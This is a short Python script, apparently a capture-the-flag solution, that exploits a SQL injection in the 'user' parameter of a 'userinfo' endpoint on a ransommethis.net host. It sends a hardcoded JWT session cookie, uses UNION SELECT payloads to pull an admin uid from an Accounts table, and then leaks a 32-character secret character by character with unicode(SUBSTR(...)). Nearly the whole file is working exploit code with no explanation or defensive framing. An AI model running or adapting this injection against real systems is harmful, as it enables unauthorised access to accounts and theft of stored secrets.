import requests as r

url: str = "https://svvkkrekekpuvfcl.ransommethis.net/mdfhjooavqjkqbsn/userinfo"
params: str = (
    f"user=x' union select isAdmin,uid,0,0 from Accounts ORDER BY isAdmin DESC --"
)
headers: dict[str, str] = {
    "cookie": "tok=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NjgyMjg5NTcsImV4cCI6MTY3MDgyMDk1Nywic2VjIjoiZm95bnZodFd0RmpndTM2WXNJT3VLYzZOMUNkb2VzQWMiLCJ1aWQiOjQyOTM2fQ.fCpNqiWX9bZzhzBViSXtb11yfxLe6e7s6O7NG986Mtw"
}
line: list[int] = [90, 96, 102]
resp: list[str] = r.get(url, params=params, headers=headers).text.splitlines()
uid = "".join(c for c in resp[line[0]] if c.isdigit())
secret = ""
for i in range(1, 32, 3):
    for l in line:
        params: str = f"user=x' union select isAdmin,unicode(SUBSTR(secret,{i},1)),unicode(SUBSTR(secret,{i+1 if i + 1 <= 32 else 1},1)),unicode(SUBSTR(secret,{i+2 if i + 2 <= 32 else 1},1)) from Accounts ORDER BY isAdmin DESC --"
        resp: list[str] = r.get(url, params=params, headers=headers).text.splitlines()
        secret += chr(int("".join(c for c in resp[l] if c.isdigit())))

print(f"Secret is: {secret[:32:]}\nUID is: {uid}")
